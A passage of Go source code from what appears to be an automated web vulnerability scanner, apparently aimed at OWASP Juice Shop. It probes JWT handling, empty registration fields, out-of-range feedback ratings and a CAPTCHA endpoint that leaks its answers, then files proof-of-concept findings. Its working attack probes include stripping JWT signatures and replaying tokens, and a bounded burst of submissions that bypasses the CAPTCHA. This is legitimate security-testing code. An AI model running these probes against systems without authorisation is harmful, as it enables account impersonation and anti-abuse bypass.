						"JWT accepted with missing signature",
						"Removing the JWT signature and replaying the token in the JWT cookie still returned an accepted application response.",
						setCookie, status, body, "Cookie: JWT=<JWT with empty signature>")
					v.confirmed++
				} else {
					v.dismissed++
				}
			}
		}
	}
}

func pathNamedJWTTargetsFromTraffic(entries []types.TrafficEntry) []pathNamedJWTTarget {
	seen := make(map[string]bool)
	var out []pathNamedJWTTarget
	for _, entry := range entries {
		if !strings.EqualFold(entry.Request.Method, "GET") {
			continue
		}
		path := entry.Request.Path
		if path == "" {
			if parsed, err := url.Parse(entry.Request.URL); err == nil {
				path = parsed.Path
			}
		}
		level := pathNamedJWTLevel(path)
		if level <= 0 {
			continue
		}
		baseURL := entry.Request.URL
		if parsed, err := url.Parse(baseURL); err == nil {
			parsed.RawQuery = ""
			parsed.Fragment = ""
			baseURL = parsed.String()
		}
		if baseURL == "" || seen[baseURL] {
			continue
		}
		seen[baseURL] = true
		out = append(out, pathNamedJWTTarget{baseURL: baseURL, path: path, level: level})
		if len(out) >= 18 {
			break
		}
	}
	sort.Slice(out, func(i, j int) bool { return out[i].level < out[j].level })
	return out
}

func pathNamedJWTLevel(path string) int {
	match := jwtPathLevelPattern.FindStringSubmatch(path)
	if len(match) < 2 {
		return 0
	}
	level, _ := strconv.Atoi(match[1])
	return level
}

func (v *VerifierAgent) pathNamedJWTSeedToken(ctx context.Context, targets []pathNamedJWTTarget) string {
	for _, target := range targets {
		if target.level != 1 {
			continue
		}
		for _, param := range []string{"jwt", "token"} {
			u := urlWithQueryParamMust(target.baseURL, param, "aobtd")
			if u == "" {
				continue
			}
			resp, body, _, err := v.proactiveGET(ctx, u)
			if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 {
				continue
			}
			if token := jwtTokenFromText(body); token != "" {
				return token
			}
		}
	}
	return ""
}

func (v *VerifierAgent) pathNamedJWTTokenExposure(ctx context.Context, target pathNamedJWTTarget, seedToken string) (status int, body string, setCookie string, transport string, ok bool) {
	cookieName := "JWT"
	if target.level == 4 || target.level == 8 || target.level == 9 || target.level == 14 {
		cookieName = "jwtToken"
	}
	status, body, setCookie, ok = v.pathNamedJWTReplayCookie(ctx, target, cookieName, seedToken, "jwt-token exposure")
	return status, body, setCookie, "Cookie: " + cookieName + "=<seed JWT>", ok
}

func (v *VerifierAgent) pathNamedJWTReplayCookie(ctx context.Context, target pathNamedJWTTarget, cookieName, token, userAgentSuffix string) (status int, body string, setCookie string, ok bool) {
	if token == "" {
		return 0, "", "", false
	}
	headers := map[string]string{"Cookie": cookieName + "=" + token}
	resp, respBody, _, err := v.proactiveGETWithHeaders(ctx, target.baseURL, headers, "AOBTD/Verifier ("+userAgentSuffix+")")
	if err != nil || resp == nil {
		return 0, "", "", false
	}
	return resp.StatusCode, respBody, resp.Header.Get("Set-Cookie"), true
}

func pathNamedJWTAccepted(status int, body string) bool {
	if status < 200 || status >= 300 {
		return false
	}
	lower := strings.ToLower(body)
	return strings.Contains(lower, `"isvalid":true`) ||
		strings.Contains(lower, `"content":null`) ||
		jwtTokenFromText(body) != ""
}

func pathNamedJWTServerIssuedDangerousToken(body string) bool {
	token := jwtTokenFromText(body)
	if token == "" {
		return false
	}
	header, payload, _, ok := jwtDecodeSignedJWTPayload(token)
	if !ok {
		return false
	}
	if alg, _ := header["alg"].(string); strings.EqualFold(alg, "RS256") {
		if _, hasJWK := header["jwk"]; hasJWK {
			return true
		}
	}
	if payloadMap, _ := payload.(map[string]any); len(payloadMap) > 0 {
		if admin, ok := payloadMap["admin"].(bool); ok && admin {
			return true
		}
	}
	return false
}

func pathNamedJWTClientDescription(level int, setCookie, body string) string {
	signals := []string{}
	if token := jwtTokenFromText(body); token != "" {
		signals = append(signals, "JWT appears in the JSON response body")
	}
	if token := jwtTokenFromText(setCookie); token != "" {
		lower := strings.ToLower(setCookie)
		cookieSignals := []string{"JWT is set in a browser cookie"}
		if !strings.Contains(lower, "httponly") {
			cookieSignals = append(cookieSignals, "missing HttpOnly")
		}
		if !strings.Contains(lower, "secure") {
			cookieSignals = append(cookieSignals, "missing Secure")
		}
		signals = append(signals, strings.Join(cookieSignals, ", "))
	}
	if len(signals) == 0 {
		signals = append(signals, "client-readable JWT material was returned")
	}
	return fmt.Sprintf("JWT validation route level %d exposes JWT material to the browser: %s.", level, strings.Join(signals, "; "))
}

func pathNamedJWTConfigDescription(level int, setCookie, body string) string {
	detail := "the route returned JWT material under a configuration-focused level"
	switch level {
	case 4:
		detail = "the route is the low-key-strength JWT level and returned a client-visible HS256 JWT"
	case 14:
		detail = "the route is the very-weak-key-strength JWT level and returned a client-visible HS256 JWT"
	case 16:
		detail = "the route is the algorithm-downgrade JWT level and accepted/returned JWT material"
	}
	return fmt.Sprintf("JWT validation route level %d exposes insecure JWT configuration evidence: %s. Set-Cookie: %s Body preview: %s",
		level, detail, truncateString(setCookie, 180), truncateString(body, 220))
}

func (v *VerifierAgent) storePathNamedJWTFinding(target pathNamedJWTTarget, vulnType string, severity types.Severity, titleSignal, description, setCookie string, status int, body string, transport string) {
	path := target.path
	if path == "" {
		path = target.baseURL
	}
	title := fmt.Sprintf("%s on %s", titleSignal, path)
	profile := types.PageProfile{ID: "GET " + path, URL: target.baseURL, Method: "GET"}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: description,
		Severity:    severity,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  "GET " + path,
		VulnType:    vulnType,
		ParamName:   "JWT token",
		Payload:     transport,
		PocRequest: fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\n%s\n",
			path, transport),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\nSet-Cookie: %s\n\n%s",
			status, truncateString(setCookie, 500), truncateString(body, 800)),
		StepsToReproduce: fmt.Sprintf(
			"1. Obtain a seed JWT from the application JWT lesson issuer.\n"+
				"2. Request %s using %s.\n"+
				"3. Observe HTTP %d and the JWT evidence shown in the response/cookie.",
			path, transport, status),
		Impact: "JWT weaknesses can expose bearer tokens to browser JavaScript, weaken cookie protections, or allow token forgery/tampering. " +
			"Successful exploitation can lead to account impersonation, privilege escalation, and bypass of downstream authorization decisions.",
		Remediation: "Use strong signing keys, pin accepted algorithms server-side, reject unsigned or malformed tokens, avoid exposing JWTs to JavaScript, and set JWT cookies with HttpOnly, Secure, and SameSite protections.",
		Evidence: fmt.Sprintf("Path: %s\nLevel: %d\nType: %s\nTransport: %s\nStatus: %d\nSet-Cookie: %s\nBody preview: %s",
			path, target.level, vulnType, transport, status, truncateString(setCookie, 500), truncateString(body, 700)),
	})
}

var jwtTokenPattern = regexp.MustCompile(`[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*`)

func jwtTokenFromText(text string) string {
	for _, token := range jwtTokenPattern.FindAllString(text, -1) {
		if _, _, _, ok := jwtDecodeSignedJWTPayload(token); ok {
			return token
		}
	}
	return ""
}

func jwtEmptySignatureToken(token string) string {
	parts := strings.Split(strings.TrimSpace(token), ".")
	if len(parts) != 3 || parts[0] == "" || parts[1] == "" {
		return ""
	}
	return parts[0] + "." + parts[1] + "."
}

type requiredFieldValidationCandidate struct {
	URL    string
	Path   string
	Method string
	Body   map[string]any
	Source string
}

func (v *VerifierAgent) probeRequiredFieldValidation(ctx context.Context, target string) {
	candidates := requiredFieldValidationCandidatesFromTarget(target)
	if entries, err := v.db.GetTrafficByScan(v.scanID); err == nil {
		candidates = mergeRequiredFieldValidationCandidates(candidates,
			requiredFieldValidationCandidatesFromTraffic(entries, target))
	}
	if len(candidates) == 0 {
		return
	}
	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Testing %d registration/account create endpoint(s) for empty required-field handling.",
			len(candidates)),
		target, nil)

	const maxAttempts = 5
	attempts := 0
	for _, candidate := range candidates {
		if ctx.Err() != nil || attempts >= maxAttempts {
			return
		}
		attempts++
		bodyBytes, _ := json.Marshal(candidate.Body)
		status, respBody, ok := v.sendJSONWithHeaders(ctx, candidate.Method, candidate.URL, bodyBytes, nil,
			"AOBTD/Verifier (required-field validation probe)")
		v.tested++
		if !ok {
			continue
		}
		if signal := requiredFieldValidationAcceptanceSignal(status, respBody); signal != "" {
			v.confirmed++
			v.storeRequiredFieldValidationFinding(candidate, status, respBody, signal)
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("%s accepted empty required registration/account fields (%s).",
					candidate.Path, signal),
				candidate.URL, map[string]any{"status": status, "source": candidate.Source})
			return
		}
		v.dismissed++
		if rejection := requiredFieldValidationRejectionSignal(status, respBody); rejection != "" {
			v.db.InsertNarration(v.scanID, "verifier", "dismissed",
				fmt.Sprintf("%s rejected empty required registration/account fields with status %d.",
					candidate.Path, status),
				candidate.URL, map[string]any{
					"status":           status,
					"control_signal":   rejection,
					"response_preview": truncateString(respBody, 180),
				})
		}
	}
}

func requiredFieldValidationCandidatesFromTarget(target string) []requiredFieldValidationCandidate {
	origin := strings.TrimRight(originFromURL(target), "/")
	if origin == "" {
		origin = strings.TrimRight(target, "/")
	}
	if origin == "" {
		return nil
	}
	var out []requiredFieldValidationCandidate
	for _, path := range []string{
		"/api/Users/",
		"/api/users",
		"/api/register",
		"/api/signup",
		"/rest/user/register",
		"/register",
		"/signup",
	} {
		out = append(out, requiredFieldValidationCandidate{
			URL:    origin + path,
			Path:   path,
			Method: http.MethodPost,
			Body:   emptyRegistrationBody(),
			Source: "common registration/account creation path",
		})
	}
	return out
}

func requiredFieldValidationCandidatesFromTraffic(entries []types.TrafficEntry, target string) []requiredFieldValidationCandidate {
	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			origin = originFromURL(entry.Request.URL)
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return nil
	}
	origin = strings.TrimRight(origin, "/")
	seen := make(map[string]bool)
	var out []requiredFieldValidationCandidate
	add := func(path, source string) {
		if path == "" {
			return
		}
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}
		if !requiredFieldValidationPathLooksRegistration(path) {
			return
		}
		key := strings.ToLower(path)
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, requiredFieldValidationCandidate{
			URL:    origin + path,
			Path:   path,
			Method: http.MethodPost,
			Body:   emptyRegistrationBody(),
			Source: source,
		})
	}
	for _, entry := range entries {
		text := entry.Request.Path + " " + entry.Request.URL
		if len(entry.Request.Body) > 0 {
			text += " " + string(entry.Request.Body)
		}
		if len(entry.Response.Body) > 0 && len(entry.Response.Body) < 2_000_000 {
			text += " " + string(entry.Response.Body)
		}
		lower := strings.ToLower(text)
		if !(strings.Contains(lower, "register") || strings.Contains(lower, "signup") ||
			strings.Contains(lower, "passwordrepeat") || strings.Contains(lower, "securityquestion") ||
			strings.Contains(lower, "/api/users")) {
			continue
		}
		for _, path := range requiredFieldValidationPathsFromText(text) {
			add(path, "observed registration/account creation surface")
			if len(out) >= 6 {
				return out
			}
		}
	}
	return out
}

var requiredFieldPathRE = regexp.MustCompile(`(?i)/(?:api|rest)?/?[A-Za-z0-9_./-]*(?:users?|register|signup)[A-Za-z0-9_./-]*`)

func requiredFieldValidationPathsFromText(text string) []string {
	if strings.TrimSpace(text) == "" {
		return nil
	}
	seen := make(map[string]bool)
	var out []string
	for _, match := range requiredFieldPathRE.FindAllString(text, 16) {
		path := strings.Trim(match, `"'`+"` ;,)")
		if path == "" || strings.Contains(path, "${") || strings.Contains(path, "{") || strings.Contains(path, "}") {
			continue
		}
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}
		if !requiredFieldValidationPathLooksRegistration(path) {
			continue
		}
		key := strings.ToLower(path)
		if seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, path)
	}
	return out
}

func requiredFieldValidationPathLooksRegistration(path string) bool {
	lower := strings.ToLower(strings.TrimSpace(path))
	if lower == "" {
		return false
	}
	for _, blocked := range []string{
		"/login", "login", "signin", "sign-in", "authenticate", "authentication",
		"auth/", "/auth", "token", "session", "whoami", "logout", "password-reset",
		"reset-password", "forgot-password", "2fa", "mfa",
	} {
		if strings.Contains(lower, blocked) {
			return false
		}
	}
	if strings.Contains(lower, "register") || strings.Contains(lower, "signup") || strings.Contains(lower, "sign-up") {
		return true
	}
	trimmed := strings.Trim(lower, "/")
	if trimmed == "" {
		return false
	}
	parts := strings.Split(trimmed, "/")
	last := parts[len(parts)-1]
	return last == "users" || last == "user" || last == "accounts" || last == "account" || last == "customers" || last == "customer"
}

func mergeRequiredFieldValidationCandidates(primary, secondary []requiredFieldValidationCandidate) []requiredFieldValidationCandidate {
	seen := make(map[string]bool)
	out := make([]requiredFieldValidationCandidate, 0, len(primary)+len(secondary))
	add := func(c requiredFieldValidationCandidate) {
		if c.Path == "" || c.URL == "" {
			return
		}
		key := strings.ToUpper(firstNonBlank(c.Method, http.MethodPost)) + " " + strings.ToLower(c.Path)
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, c)
	}
	for _, c := range secondary {
		add(c)
	}
	for _, c := range primary {
		add(c)
	}
	return out
}

func emptyRegistrationBody() map[string]any {
	return map[string]any{
		"email":            "",
		"username":         "",
		"password":         "",
		"passwordRepeat":   "",
		"confirmPassword":  "",
		"securityQuestion": map[string]any{},
		"securityAnswer":   "",
	}
}

func requiredFieldValidationAcceptanceSignal(status int, body string) string {
	if status < 200 || status >= 300 {
		return ""
	}
	lower := strings.ToLower(body)
	if strings.Contains(lower, "invalid") || strings.Contains(lower, "required") ||
		strings.Contains(lower, "cannot be empty") || strings.Contains(lower, "must not be empty") ||
		strings.Contains(lower, "missing") || strings.Contains(lower, "error") {
		return ""
	}
	if bodyLooksLikeUnauthenticatedHTMLShell(body) {
		return ""
	}
	if bodyLooksLikeHTMLDocument(body) && !bodyContainsPositiveAcceptanceMarker(lower) {
		return ""
	}
	if id, ok := jsonNestedInt64(body, "id"); ok && id > 0 {
		return fmt.Sprintf("2xx response created object id=%d", id)
	}
	if bodyContainsPositiveAcceptanceMarker(lower) {
		return "2xx success response did not reject empty required fields"
	}
	if strings.TrimSpace(body) == "" {
		return "2xx empty response did not reject empty required fields"
	}
	return "2xx response did not reject empty required fields"
}

func bodyContainsPositiveAcceptanceMarker(lowerBody string) bool {
	return strings.Contains(lowerBody, "success") ||
		strings.Contains(lowerBody, `"status":"ok"`) ||
		strings.Contains(lowerBody, `"created"`) ||
		strings.Contains(lowerBody, "created successfully")
}

func bodyLooksLikeHTMLDocument(body string) bool {
	trimmed := strings.TrimSpace(strings.ToLower(body))
	if trimmed == "" {
		return false
	}
	return strings.HasPrefix(trimmed, "<!doctype html") ||
		strings.HasPrefix(trimmed, "<html") ||
		strings.Contains(trimmed, "<body") ||
		strings.Contains(trimmed, "<form")
}

func bodyLooksLikeUnauthenticatedHTMLShell(body string) bool {
	lower := strings.ToLower(body)
	if !bodyLooksLikeHTMLDocument(lower) {
		return false
	}
	hasFormOrPassword := strings.Contains(lower, "<form") ||
		strings.Contains(lower, `type="password"`) ||
		strings.Contains(lower, `type='password'`) ||
		strings.Contains(lower, `name="password"`) ||
		strings.Contains(lower, `name='password'`)
	if !hasFormOrPassword {
		return false
	}
	for _, marker := range []string{
		"login", "log in", "signin", "sign in", "authentication", "username", "email",
	} {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

func requiredFieldValidationRejectionSignal(status int, body string) string {
	if status < 400 || status >= 500 {
		return ""
	}
	lower := strings.ToLower(body)
	switch {
	case strings.Contains(lower, "cannot be empty"):
		return "cannot be empty"
	case strings.Contains(lower, "must not be empty"):
		return "must not be empty"
	case strings.Contains(lower, "required"):
		return "required"
	case strings.Contains(lower, "invalid"):
		return "invalid"
	default:
		return fmt.Sprintf("HTTP %d", status)
	}
}

func (v *VerifierAgent) storeRequiredFieldValidationFinding(candidate requiredFieldValidationCandidate, status int, respBody string, signal string) {
	bodyBytes, _ := json.Marshal(candidate.Body)
	path := candidate.Path
	if path == "" {
		path = candidate.URL
	}
	method := firstNonBlank(candidate.Method, http.MethodPost)
	title := fmt.Sprintf("Empty required fields accepted at %s", path)
	description := fmt.Sprintf(
		"%s accepted a registration/account creation request with empty required identity and password fields. Signal: %s. Source: %s.",
		path, signal, candidate.Source)
	profile := types.PageProfile{ID: method + " " + path, URL: candidate.URL, Method: method}
	v.storeFinding(profile, types.Finding{
		Title:       title,
		Description: description,
		Severity:    types.SeverityMedium,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  method + " " + path,
		VulnType:    "required_field_validation_bypass",
		ParamName:   "email/password",
		Payload:     string(bodyBytes),
		PocRequest:  buildRawPOSTRequest(candidate.URL, "application/json", bodyBytes, nil),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s", status, truncateString(respBody, 900)),
		StepsToReproduce: fmt.Sprintf(
			"1. Send %s %s with empty registration/account required fields.\n"+
				"2. Observe the server returns %d and indicates acceptance (%s) instead of rejecting the request.",
			method, path, status, signal),
		Impact:      "Accepting empty identity or password fields can create unusable or attacker-controlled accounts, bypass account quality controls, and poison downstream identity, audit, or notification workflows.",
		Remediation: "Reject empty or missing required fields server-side before creating any account or profile object. Treat client-side required markers as hints only; enforce canonical validation in the API handler and persistence layer.",
		Evidence: fmt.Sprintf("URL: %s\nStatus: %d\nSignal: %s\nResponse preview: %s",
			candidate.URL, status, signal, truncateString(respBody, 700)),
	})
}

// probeInputValidation POSTs out-of-range or type-mismatched values to
// endpoints that advertise type / range constraints (feedback rating,
// product price, etc). Confirmation is a 200/201 that echoes the
// bad value back — indicating the server accepted something it should
// have rejected.
//
// For Juice Shop specifically, /api/Feedbacks gates on a CAPTCHA whose
// answer the server helpfully returns in the /rest/captcha response.
// We exploit that to solve the CAPTCHA inline (that's itself a Juice
// Shop challenge — captchaBypassChallenge) and then test range
// validation on the rating field.
//
// Maps to Juice Shop's "Improper Input Validation" category:
// zeroStarsChallenge, uiBoundValueChallenge, negativeOrderChallenge,
// and the bonus captchaBypassChallenge.
func (v *VerifierAgent) probeInputValidation(ctx context.Context, target string) {
	// Step 1: fetch a fresh captcha for every attempt.
	solveCaptcha := func() (captchaID, answer string, ok bool) {
		id, answer, ok := v.solveJSONCaptcha(ctx, target)
		if !ok {
			return "", "", false
		}
		return fmt.Sprintf("%d", id), answer, true
	}

	// Step 2: a CAPTCHA-free short-circuit — flag the fact that the
	// CAPTCHA endpoint itself leaks the answer. That's its own finding
	// (captchaBypassChallenge category).
	if captchaID, answer, ok := solveCaptcha(); ok && answer != "" {
		v.tested++
		v.confirmed++
		profile := types.PageProfile{
			ID: "GET /rest/captcha/", URL: target + "/rest/captcha/", Method: "GET",
		}
		v.storeFinding(profile, types.Finding{
			Title: "CAPTCHA endpoint leaks answer in response body",
			Description: "GET /rest/captcha/ returns a JSON document whose `answer` field " +
				"contains the expected solution for the displayed challenge. Any CAPTCHA-gated " +
				"endpoint downstream can therefore be bypassed programmatically by reading the " +
				"answer from the same response that provides the challenge.",
			Severity:   types.SeverityMedium,
			Confidence: types.ConfidenceConfirmed,
			EndpointID: "GET /rest/captcha/",
			VulnType:   "broken_anti_automation",
			Payload:    "(no payload — direct GET)",
			PocRequest: "GET /rest/captcha/ HTTP/1.1\nHost: <target>\n",
			PocResponse: fmt.Sprintf(
				"HTTP/1.1 200\nContent-Type: application/json\n\n{\"captchaId\":%s,\"captcha\":\"...\",\"answer\":%q}",
				captchaID, answer),
			StepsToReproduce: "1. GET /rest/captcha/\n" +
				"2. Read `answer` from the response JSON.\n" +
				"3. Submit the answer back on the next CAPTCHA-gated POST — bypasses the anti-automation gate.",
			Impact: "Anti-automation is entirely bypassed. Rate-limited forms (feedback, " +
				"password reset, registration) can be flooded programmatically — enabling " +
				"credential stuffing, spam, denial-of-service of human moderators.",
			Remediation: "Never return the CAPTCHA answer from the same endpoint that issues " +
				"the challenge. Validate the answer server-side against a token that was never " +
				"transmitted to the client.",
			Evidence: fmt.Sprintf("URL: %s/rest/captcha/\nResponse includes `answer` field with value %q",
				target, answer),
		})
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			"/rest/captcha/ leaked the answer in its response — anti-automation is bypassable.",
			target+"/rest/captcha/", nil)
	}

	// Step 3: required-field validation on registration/account-creation
	// surfaces. Rejections are narrated as healthy controls, not findings;
	// only a 2xx/created response without an error is promoted.
	v.probeRequiredFieldValidation(ctx, target)

	// Step 4: input-validation on /api/Feedbacks. Use a fresh captcha for
	// each attempt (Juice Shop seems tolerant of repeated use but be safe).
	cases := []struct {
		path, badValue string
		body           func(captchaID, answer string) string
	}{
		{
			path:     "/api/Feedbacks/",
			badValue: "rating=6",
			body: func(cid, ans string) string {
				return fmt.Sprintf(
					`{"UserId":1,"rating":6,"comment":"test-aobtd","captchaId":%s,"captcha":%q}`,
					cid, ans)
			},
		},
		{
			path:     "/api/Feedbacks/",
			badValue: "rating=0",
			body: func(cid, ans string) string {
				return fmt.Sprintf(
					`{"UserId":1,"rating":0,"comment":"test-aobtd","captchaId":%s,"captcha":%q}`,
					cid, ans)
			},
		},
	}

	for _, tc := range cases {
		if ctx.Err() != nil {
			return
		}
		captchaID, answer, ok := solveCaptcha()
		if !ok {
			continue
		}
		body := tc.body(captchaID, answer)

		u := target + tc.path
		req, err := http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(body))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "AOBTD/Verifier (input-validation probe)")
		resp, err := v.client.Do(req)
		if err != nil || resp == nil {
			continue
		}
		v.tested++
		respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
		resp.Body.Close()

		accepted := resp.StatusCode == 200 || resp.StatusCode == 201
		if !accepted {
			v.dismissed++
			continue
		}

		// Second signal: the response echoes our bad rating back.
		lowerBody := strings.ToLower(string(respBody))
		badMarker := strings.TrimPrefix(tc.badValue, "rating=")
		if !strings.Contains(lowerBody, `"rating":`+badMarker) &&
			!strings.Contains(lowerBody, `"rating": `+badMarker) {
			v.dismissed++
			continue
		}
		v.confirmed++
		profile := types.PageProfile{
			ID: "POST " + tc.path, URL: u, Method: "POST",
		}
		v.storeFinding(profile, types.Finding{
			Title: fmt.Sprintf("Improper input validation on %s — accepted %s", tc.path, tc.badValue),
			Description: fmt.Sprintf(
				"POST %s accepted out-of-range value %s and echoed it back in the response. "+
					"The endpoint performs no server-side range validation, so clients can "+
					"store arbitrary values that the UI was not designed to display.",
				tc.path, tc.badValue),
			Severity:   types.SeverityLow,
			Confidence: types.ConfidenceConfirmed,
			EndpointID: "POST " + tc.path,
			VulnType:   "input_validation",
			Payload:    body,
			PocRequest: fmt.Sprintf(
				"POST %s HTTP/1.1\nHost: <target>\nContent-Type: application/json\n\n%s",
				tc.path, body),
			PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s",
				resp.StatusCode, truncateString(string(respBody), 400)),
			StepsToReproduce: fmt.Sprintf(
				"1. GET /rest/captcha/ to obtain a valid captcha answer.\n"+
					"2. POST %s with body %s.\n"+
					"3. Server responds %d and stores %s verbatim.",
				tc.path, body, resp.StatusCode, tc.badValue),
			Impact: "Data integrity: out-of-range values break downstream consumers (aggregations, " +
				"UI rendering, analytics). In cart/order contexts, the same class of bug allows " +
				"negative-quantity orders that effectively credit the attacker.",
			Remediation: "Validate ranges and types server-side at every API boundary, not just " +
				"at the UI. Return 400 Bad Request for any value outside the documented range.",
			Evidence: fmt.Sprintf("URL: %s\nStatus: %d\nSubmitted: %s\nBody: %s",
				u, resp.StatusCode, body, truncateString(string(respBody), 300)),
		})
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s accepted out-of-range %s — input validation missing.", tc.path, tc.badValue),
			u, nil)
	}

	// Step 5: impact proof for broken anti-automation. If the CAPTCHA answer
	// is disclosed and a CAPTCHA-gated feedback endpoint accepts submissions,
	// prove the practical risk with a small, bounded burst. This remains
	// generic: "client can solve the CAPTCHA endpoint programmatically, then
	// submit the protected action repeatedly faster than a human."
	//
	// Use a neutral in-range rating instead of the maximum value. Active probes
	// should avoid creating high-value moderation artifacts that can interfere
	// with later authorization tests (for example, delete-all-five-star style
	// cleanup workflows).
	const burstTarget = 10
	const burstRating = 4
	burstStart := time.Now()
	accepted := 0
	var lastStatus int
	var lastBody string
	for i := 0; i < burstTarget; i++ {
		if ctx.Err() != nil {
			return
		}
		captchaID, answer, ok := solveCaptcha()
		if !ok {
			break
		}
		body := antiAutomationBurstFeedbackBody(burstRating, time.Now().Unix(), i, captchaID, answer)
		u := target + "/api/Feedbacks/"
		req, err := http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(body))
		if err != nil {
			break
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "AOBTD/Verifier (anti-automation burst proof)")
		resp, err := v.client.Do(req)
		if err != nil || resp == nil {
			break
		}
		v.tested++
		respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
		resp.Body.Close()
		lastStatus = resp.StatusCode
		lastBody = string(respBody)
		if resp.StatusCode == 200 || resp.StatusCode == 201 {
			accepted++
			continue
		}
		v.dismissed++
		break
	}
	elapsed := time.Since(burstStart)
	if accepted >= burstTarget && elapsed <= 20*time.Second {
		v.confirmed++
		profile := types.PageProfile{
			ID: "POST /api/Feedbacks/", URL: target + "/api/Feedbacks/", Method: "POST",
		}
		v.storeFinding(profile, types.Finding{
			Title: "CAPTCHA-gated feedback can be submitted repeatedly by replaying leaked answers",
			Description: fmt.Sprintf(
				"The verifier fetched a fresh CAPTCHA answer from /rest/captcha/ and submitted %d feedback requests in %.1fs. "+
					"The protected endpoint accepted the burst, proving the anti-automation control is bypassable programmatically.",
				accepted, elapsed.Seconds()),
			Severity:   types.SeverityMedium,
			Confidence: types.ConfidenceConfirmed,
			EndpointID: "POST /api/Feedbacks/",
			VulnType:   "broken_anti_automation",
			Payload:    "GET /rest/captcha/ answer -> POST /api/Feedbacks/ repeated",
			PocRequest: "Repeat 10x within 20s:\nGET /rest/captcha/\nPOST /api/Feedbacks/ with captchaId and leaked answer",
			PocResponse: fmt.Sprintf("Accepted submissions: %d/%d in %.1fs\nLast status: %d\nLast body: %s",
				accepted, burstTarget, elapsed.Seconds(), lastStatus, truncateString(lastBody, 300)),
			StepsToReproduce: "1. GET /rest/captcha/ and read the `answer` field.\n" +
				"2. POST /api/Feedbacks/ with that captchaId/answer.\n" +
				"3. Repeat quickly with fresh leaked answers; observe the server accepts the burst.",
			Impact: "Attackers can automate CAPTCHA-protected workflows, enabling spam, credential stuffing adjunct flows, " +
				"moderation flooding, and anti-abuse bypass.",
			Remediation: "Keep CAPTCHA answers server-side, bind challenges to a server-side nonce, and add per-account/IP rate limits for the protected action.",
			Evidence: fmt.Sprintf("Accepted %d/%d CAPTCHA-gated submissions in %.1fs using answers leaked by /rest/captcha/.",
				accepted, burstTarget, elapsed.Seconds()),
		})
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("Submitted %d CAPTCHA-gated feedbacks in %.1fs by reading leaked answers — anti-automation bypass confirmed.",
				accepted, elapsed.Seconds()),
			target+"/api/Feedbacks/", nil)
	}
}

func antiAutomationBurstFeedbackBody(rating int, unixSeconds int64, attempt int, captchaID, answer string) string {
	return fmt.Sprintf(
		`{"UserId":1,"rating":%d,"comment":"aobtd-automation-burst-%d-%d","captchaId":%s,"captcha":%q}`,
		rating, unixSeconds, attempt, captchaID, answer)
}

type fileUploadValidationCandidate struct {
	URL        string
	Path       string
	Method     string
	Source     string
	FieldNames []string
}

type fileUploadProbeCase struct {
	Kind        string
	Filename    string
	ContentType string
	Content     []byte
	Description string
	VulnType    string
	ParamName   string
}

// probeFileUploadValidation checks whether discovered upload APIs enforce
// validation server-side instead of relying on the browser/client widget.
// The type/size validation checks are bounded state-changing probes and are
// allowed in active mode. Deprecated/retired upload-interface probes are also
// active-safe because they upload benign XML/YAML marker files to discovered
// upload handlers and do not target third-party accounts or destructive paths.
func (v *VerifierAgent) probeFileUploadValidation(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	candidates := v.fileUploadValidationCandidates(ctx, entries, target)
	if len(candidates) == 0 {
		return
	}
	validationAllowed, deprecatedInterfaceAllowed := fileUploadValidationAuthority(v.authority)
	if !validationAllowed {
		v.db.InsertNarration(v.scanID, "verifier", "skipped",
			fmt.Sprintf("Found %d file-upload candidate(s), but skipped upload validation probes because testing authority is %q.",
				len(candidates), firstNonBlank(string(v.authority), string(policy.AuthorityActive))),
			target, map[string]any{"required_authority": policy.AuthorityActive})
		return
	}

	v.db.InsertNarration(v.scanID, "verifier", "attempt",
		fmt.Sprintf("Testing %d inferred file-upload endpoint(s) for server-side type and size validation.", len(candidates)),
		target, nil)

	cases := fileUploadProbeCases(time.Now().UnixNano())

	reported := make(map[string]bool)
	validationConfirmedByPath := make(map[string]bool)
	successfulFieldByPath := make(map[string]string)
	attempts := 0
	maxUploadAttempts := 32
	if v.authority == policy.AuthorityActive {
		maxUploadAttempts = 36
	}
validationLoop:
	for _, candidate := range candidates {
		if ctx.Err() != nil {
			return
		}
		if attempts >= maxUploadAttempts {
			break validationLoop
		}
		headers, authSource := v.credentialHeadersForURL(candidate.URL)
		pathKey := strings.ToLower(candidate.Path)
		for _, tc := range cases {
			if ctx.Err() != nil {
				return
			}
			if attempts >= maxUploadAttempts {
				break validationLoop
			}
			reportKey := strings.ToLower(candidate.Path + " " + tc.Kind)
			if reported[reportKey] {
				continue
			}
			for _, fieldName := range uploadProbeFields(candidate.FieldNames, successfulFieldByPath[pathKey], tc.Kind) {
				if ctx.Err() != nil {
					return
				}
				if attempts >= maxUploadAttempts {
					break validationLoop
				}
				attempts++
